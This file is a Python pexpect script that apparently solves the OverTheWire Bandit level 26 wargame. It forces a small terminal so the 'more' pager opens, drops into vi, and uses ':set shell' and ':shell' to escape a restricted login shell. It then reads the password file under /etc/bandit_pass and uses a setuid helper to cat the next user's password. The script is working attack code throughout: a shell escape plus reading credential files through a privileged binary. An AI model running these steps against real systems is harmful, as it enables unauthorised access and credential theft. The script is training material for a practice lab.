import pexpect
import sys
import os

def solve():
    key_file = "bandit26.sshkey"
    os.chmod(key_file, 0o600)
    user = "bandit26"
    host = "bandit.labs.overthewire.org"
    port = 2220

    # Small dimensions to trigger 'more'
    # Use -i for identity file
    cmd = f"ssh -o StrictHostKeyChecking=no -i {key_file} {user}@{host} -p {port}"
    print(f"Running: {cmd}")
    child = pexpect.spawn(cmd, dimensions=(5, 80))
    # child.logfile = sys.stdout.buffer

    try:
        # We should go straight to 'more'
        child.expect("--More--", timeout=20)
        print("Triggered 'more' pager")
        child.send("v")
        
        # Now in vi.
        child.expect("text.txt", timeout=10)
        print("Entered 'vi'")
        child.sendline(":set shell=/bin/bash")
        child.sendline(":shell")
        
        # Now we should be in a bash shell.
        child.expect(r"bandit26@bandit:.*\$", timeout=10)
        print("Successfully escaped to bash shell!")
        
        # Find the setuid binary
        child.sendline("ls -l")
        child.expect(r"bandit26@bandit:.*\$", timeout=10)
        print("Directory listing:\n", child.before.decode())
        
        # Run the setuid binary
        child.sendline("cat /etc/bandit_pass/bandit26")
        child.expect(r"bandit26@bandit:.*\$", timeout=10)
        output = child.before.decode()
        print("Raw output for bandit26 password:\n", output)

        child.sendline("./bandit27-do cat /etc/bandit_pass/bandit27")
        child.expect(r"bandit26@bandit:.*\$", timeout=10)
        output = child.before.decode()
        print("Raw output after command:\n", output)
        # The password should be on its own line
        for line in output.splitlines():
            line = line.strip()
            if line and line != "./bandit27-do cat /etc/bandit_pass/bandit27":
                print(f"Password for bandit27: {line}")
                break
        
        child.sendline("exit")
        child.sendline("exit")
    except Exception as e:
        print("Error:", e)
        if child.before:
            print("Output before error:", child.before.decode())

if __name__ == "__main__":
    solve()
